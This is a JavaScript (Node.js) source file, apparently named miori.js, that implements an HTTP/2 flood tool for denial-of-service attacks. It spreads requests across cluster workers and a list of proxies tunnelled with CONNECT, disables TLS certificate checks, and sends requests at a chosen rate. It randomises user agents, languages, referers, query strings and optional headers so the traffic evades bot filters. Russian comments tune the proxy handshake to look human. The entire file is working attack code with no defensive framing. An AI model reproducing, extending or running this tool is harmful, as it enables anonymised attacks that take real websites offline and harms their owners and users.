//bypass
const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', function (exception) {});
if (process.argv.length < 7){
    console.log(`node miori.js [target] [time] [rate] [thread] [proxy] --extra --ref --path`);
    process.exit();
}
function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}
function randomElement(elements) {
    return elements[Math.floor(Math.random() * elements.length)];
}
function randomString(length) {
    let result = '';
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}
const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    Rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6],
    extra: process.argv.includes('--extra'), // Проверка флага
    refFlag: process.argv.includes('--ref'),
    pathFlag: process.argv.includes('--path')  // Добавить флаг
};
var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);
if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 0);
}
class NetSocket {
    constructor() { }

    HTTP(options, callback) {
        // Убираем ручное приклеивание порта, если он уже есть в options.address
        const targetAddr = options.address.includes(":") ? options.address : options.address + ":443";
        
        // Формируем более "человечный" заголовок туннеля
        const payload = 
            "CONNECT " + targetAddr + " HTTP/1.1\r\n" +
            "Host: " + targetAddr + "\r\n" +
            "Connection: Keep-Alive\r\n" +
            "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36\r\n" +
            "\r\n";

        const buffer = Buffer.from(payload); // Используйте Buffer.from вместо new Buffer

        const connection = net.connect({
            host: options.host,
            port: options.port
        });

        connection.setTimeout(options.timeout * 1000); // Тайм-аут обычно в мс, 600000 — это очень много
        connection.setKeepAlive(true, 10000);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            if (!response.includes("HTTP/1.1 200")) {
                connection.destroy();
                return callback(undefined, "error: proxy handshake failed");
            }
            return callback(connection, undefined);
        });

        connection.on("error", error => {
            connection.destroy();
            return callback(undefined, "error: " + error);
        });
    }
}

const Socker = new NetSocket();

const fetch_site = ["none", "same-origin", "same-site", "cross-site"];
const languages = [
    "en-US,en;q=0.9",
    "en-GB,en;q=0.8",
    "es-ES,es;q=0.9",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8",
    "ar-SA,ar;q=0.9,en;q=0.8",
    "id-ID,id;q=0.9,en;q=0.8",
    "pt-BR,pt;q=0.9,en;q=0.8",
    "ru-RU,ru;q=0.9,en;q=0.8",
    "hi-IN,hi;q=0.9,en;q=0.8",
    "bn-BD,bn;q=0.9,en;q=0.8",
    "ko-KR,ko;q=0.9,en;q=0.8",
    "tr-TR,tr;q=0.9,en;q=0.8",
    "it-IT,it;q=0.9,en;q=0.8",
    "nl-NL,nl;q=0.9,en;q=0.8",
    "pl-PL,pl;q=0.9,en;q=0.8",
    "sv-SE,sv;q=0.9,en;q=0.8",
    "da-DK,da;q=0.9,en;q=0.8"
];
const referers = [
    "https://www.reddit.com/r/programming/",
    "https://news.ycombinator.com/",
    "https://stackoverflow.com/questions/",
    "https://github.com/trending",
    "https://dev.to/",
    "https://medium.com/",
    "https://www.producthunt.com/",
    "https://lobste.rs/",
    "https://slashdot.org/",
    "https://www.indiehackers.com/",
    "https://techcrunch.com/",
    "https://www.theverge.com/",
    "https://arstechnica.com/",
    "https://www.wired.com/",
    "https://www.bloomberg.com/technology",
    "https://www.cnbc.com/technology/",
    "https://www.bbc.com/news/technology",
    "https://www.ft.com/technology",
    "https://www.economist.com/technology-quarterly",
    "https://www.zdnet.com/",
    "https://www.cnet.com/",
    "https://www.engadget.com/",
    "https://www.theguardian.com/technology",
    "https://www.reuters.com/technology/",
    "https://www.vice.com/en/section/tech",
    "https://www.wsj.com/tech",
    "https://www.forbes.com/technology/",
    "https://www.fastcompany.com/technology",
    "https://www.businessinsider.com/sai",
    "https://www.platformer.news/"
];
const useragents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:146.0) Gecko/20100101 Firefox/146.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14.1; rv:134.0) Gecko/20100101 Firefox/134.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.6; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:133.0) Gecko/20100101 Firefox/133.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_6_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_7_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (iPad; CPU OS 18_7_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/26.0 Mobile/15E148 Safari/604.1"
];
function buildHeaders() {
    let rand_path;
    if (args.pathFlag) {
        const rand_query = `?${randomString(12)}=${randomIntn(100000, 999999)}`;
        rand_path = (parsedTarget.path || "/") + rand_query;
    } else {
        rand_path = parsedTarget.path || "/";
    }
    const headers = {
        ":method": "GET",
        ":scheme": "https",
        ":authority": parsedTarget.host,
        ":path": rand_path,
        "user-agent": randomElement(useragents),
        "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
        "accept-language": randomElement(languages),
        "accept-encoding": "gzip, deflate, br, zstd",
        "sec-fetch-site": randomElement(fetch_site),
        "sec-fetch-dest": "document",
        "sec-fetch-mode": "navigate",
        "upgrade-insecure-requests": "1"
    };
    if (args.extra) {
        if (Math.random() > 0.5) {
            headers["dnt"] = "1";
        }
        if (Math.random() > 0.5) {
            headers["sec-fetch-user"] = "?1";
        }
        if (Math.random() > 0.5) {
            headers["te"] = "trailers";
        }
    }
    if (args.refFlag) {
        headers["referer"] = randomElement(referers)
    }
    return headers;
}
function runFlooder() {
    const proxyAddr = randomElement(proxies);
    const parsedProxy = proxyAddr.split(":");
    const proxyOptions = {
        host: parsedProxy[0],
        port: ~~parsedProxy[1],
        address: parsedTarget.host, // НЕ добавляем :443 здесь, класс NetSocket сделает это сам
        timeout: 10,
    };
    Socker.HTTP(proxyOptions, (connection, error) => {
        if (error) return
        connection.setKeepAlive(true, 600000);
        const tlsOptions = {
            ALPNProtocols: ['h2'],
            rejectUnauthorized: false,
            socket: connection,
            servername: parsedTarget.host
        };
        const tlsConn = tls.connect(tlsOptions);
        tlsConn.setKeepAlive(true, 60000);
        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                maxConcurrentStreams: 100,
                initialWindowSize: 4194304,
                enablePush: false,
            },
            maxSessionMemory: 64000,
            maxDeflateDynamicTableSize: 4294967295,
            createConnection: () => tlsConn
        });
        client.on("connect", () => {
            setInterval(() => {
                for (let i = 0; i < args.Rate; i++) {
                    const headers = buildHeaders();
                    const request = client.request(headers);
                    request.on("response", () => {
                        request.close();
                        request.destroy();
                        return
                    });
                    request.end();
                }
            }, 1000);
        });
        client.on("close", () => {
            client.destroy();
            connection.destroy();
            return
        });
        client.on("error", error => {
            client.destroy();
            connection.destroy();
            return
        });
    });
}

const KillScript = () => process.exit(1);
setTimeout(KillScript, args.time * 1000);
